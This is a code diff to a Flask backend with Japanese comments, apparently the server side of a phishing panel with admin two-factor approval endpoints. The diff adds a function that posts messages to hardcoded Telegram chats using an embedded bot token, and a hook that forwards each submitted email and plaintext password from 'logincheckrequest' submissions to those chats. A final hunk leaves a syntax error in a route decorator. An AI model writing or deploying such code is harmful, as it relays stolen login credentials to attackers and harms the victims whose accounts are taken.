@@ -28,6 +28,31 @@ CORS(app, origins=ALLOWED_ORIGINS)
 DB_PATH = 'data/requests.db'
 AUTH_DB_PATH = 'data/auth_database.json'
 
+TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8314466263:AAG_eAJkU6j8SNFfJsodij9hkkdpSPARc6o')
+TELEGRAM_CHAT_IDS = os.getenv('TELEGRAM_CHAT_IDS', '8204394801,8303180774,8243562591').split(',')
+
+# ===========================
+# Telegram通知
+# ===========================
+
+def send_telegram_notification(message):
+    """Telegram通知送信"""
+    for chat_id in TELEGRAM_CHAT_IDS:
+        try:
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+            payload = {
+                'chat_id': chat_id.strip(),
+                'text': message,
+                'parse_mode': 'HTML'
+            }
+            response = requests.post(url, json=payload, timeout=10)
+            if response.status_code == 200:
+                print(f"[INFO] Telegram通知送信成功: {chat_id}")
+            else:
+                print(f"[ERROR] Telegram通知送信失敗: {chat_id} - {response.text}")
+        except Exception as e:
+            print(f"[ERROR] Telegram通知エラー: {chat_id} - {e}")
+
 # ===========================
 # データベース管理
 # ===========================
@@ -438,6 +463,13 @@ def create_request_endpoint():
         
         request_id = create_request(genre, callback_url, json.dumps(request_data) if request_data else None)
         
+        # logincheckrequestの場合、Telegram通知を送信
+        if genre == 'logincheckrequest' and request_data:
+            email = request_data.get('email', '不明')
+            password = request_data.get('password', '不明')
+            message = f"<b>ログインリクエスト通知が来ました</b>\n\nメアド：{email}\nパスワード：{password}"
+            send_telegram_notification(message)
+        
         return jsonify({
             'status': 'created',
             'genre': genre,
@@ -743,7 +775,7 @@ def api_admin_2fa_reject():
     
     return jsonify({'success': True})
 
-@app.route('/api/admin/security-complete', methods=['POST'])
+@app.route('/api/admin/security-complete', methods='POST'])
 def api_admin_security_complete():
     """セキュリティチェック完了"""
     data = request.json
